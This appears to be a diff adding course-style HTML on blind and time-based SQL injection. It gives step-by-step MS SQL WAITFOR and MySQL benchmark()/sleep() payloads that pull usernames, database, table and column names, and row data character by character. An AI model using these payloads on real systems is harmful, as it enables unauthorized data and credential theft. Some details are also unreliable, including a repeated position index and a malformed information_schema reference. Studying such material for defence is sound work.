@@ -90,3 +90,94 @@ easily. One of the main distinguishing features of blind SQL injection is that i
 <h2>Extract Second Character</h2>
 <p><i>/?id=1+AND+555+if(ord(mid((select+pass+from+users+limit+0,1),2,1))=97,555,777)</i></p>
 <p>If the table "users" contains a column "pass" and the second character of the first entry in this column is 97 (letter "a"), then DBMS will return True; otherwise False</p>
+
+<h1>Blind SQL Injection - Extract Database User</h1>
+<p>The attacker can probe the database server with yes / no questions to extract information. To extract database usernames using blind SQL injection, an attacker first tries to determine the number of 
+characters in a database username. An attacker who succeeds in learning the number of characters in a username then tries to find each character in it. Finding the first letter of a username with a 
+binary search requires <b>seven requests</b>; this means that an eight character name requires <b>56 requests</b>. </p>
+<h2>Check for username length</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Keep increasing the value of LEN(USER) until DBMS returns True</p>
+
+<h2>Check if 1st character in the username contains 'A' (a=97), 'B' or 'C'</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Keep increasing the value of ASCII(lower(substring((USER),1,1))) until DBMS returns True</p>
+
+<h2>Check if 2nd character in the username contains 'A' (a=97), 'B' or 'C'</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=97) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=99) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Keep increasing the value of ASCII(lower(substring((USER),2,1))) until DBMS returns True</p>
+
+<h2>Check if 3rd character in the username contains 'A' (a=97), 'B' or 'C'</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=97) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=98) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=99) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Keep increasing the value of ASCII(lower(substring((USER),2,1))) until DBMS returns True</p>
+
+<h1>Blind SQL Injection - Extract Database Name</h1>
+<p>The attacker can extract the database name using the time-based blind SQL Injection method; The attacker can apply brute force and set the time after query execution.
+Then, the attacker can infer from the result that if the time lapse is 10 seconds, then the name is 'A'; otherwise if it is 2 seconds, then it cannot be 'A'</p>
+
+<h2>Check for Database Name Length and Name</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=97) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=98) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=99) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=100) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Database Name = ABCD (considered that the db returned True for the above statement)</p>
+
+<h2>Extract 1st Database Table</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=3) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=101) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),2,1)))=109) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),3,1)))=112) WAITFOR DELAY '00:00:10'--</i></p>
+<p>Table Name = EMP (considered returned True)</p>
+
+<h1>Blind SQL Injection - Extract Column Name</h1>
+<p>The attacker can extract the column name using the time-based blind SQL injection method</p>
+<h2>Extract 1st Table Column Name</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP')=3) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP'),1,1)))=101) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP'),2,1)))=105) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP'),3,1)))=100) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Column Name = EID (considered that the db returned True for the above statement)</p>
+
+<h2>Extract 2nd Table Column Name</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP' and column_name>'EID')=4) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP' and column_name>'EID'),1,1)))=100) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP' and column_name>'EID'),2,1)))=101) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP' and column_name>'EID'),3,1)))=112) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema_columns where table_name='EMP' and column_name>'EID'),4,1)))=116) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Column Name = DEPT (considered that the db returned True for the above statement)</p>
+
+<h1>Blind SQL Injection - Extract Data from ROWS</h1>
+<p>The attacker can extract the data from rows using the time-based blind SQL injection method</p>
+<h2>Extract 1st Field of 1st Row</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 EID from EMP)=3) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 EID FROM EMP),1,1)))=106) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 EID FROM EMP),2,1)))=111) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 EID FROM EMP),3,1)))=101) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Field Data = JOE (considered that the db returned True for the above statement)</p>
+
+<h2>Extract 2nd Field of 1st Row</h2>
+<p><i>http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 DEPT from EMP)=4) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 DEPT FROM EMP),1,1)))=100) WAITFOR DELAY '00:00:10'--</i><br/>
+    <i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 DEPT FROM EMP),2,1)))=111) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 DEPT FROM EMP),3,1)))=109) WAITFOR DELAY '00:00:10'--</i><br/>
+<i>http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 DEPT FROM EMP),4,1)))=112) WAITFOR DELAY '00:00:10'--</i><br/></p>
+<p>Field Data = COMP (considered that the db returned True for the above statement)</p>
+
+<h1>Perform Double Blind SQL Injection - Classical Exploitation (MySQL)</h1>
+<p>Double-blind SQL injection is also called time-based SQL injection. In double-blind SQL injection, an attacker inserts time delays in SQL query processing to search for characters in the database users, 
+database name, column name, row data etc. If the query with the time delay executes immediately, the condition is False. If the query executes with time delay, the query is True. Entries are read symbol by 
+symbol. Unlike other blind SQL injection techniques, this technique does not use the UNION clause or any other technique in the inserted query. Double-blind SQL injection exploitation depends on the analysis 
+of time delay. The exploitation starts by sending a query with a time delay to the web application and getting its response. In a typical double-blind injection attack, the functions <b>benchmark()</b> and 
+<b>sleep()</b> are used to process the time delays.</p>
+<p><i>.?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))</i></p>
+<p>We can conjecture that the character was guessed correctly on the basis of the time delay of the web server response; manipulating the value 2000000 we can achieve acceptable performance for a concrete 
+application; the function sleep() represents an analogue of the function benchmark(). The function sleep() is more secure in the given context because it doesn't use server resources.</p>
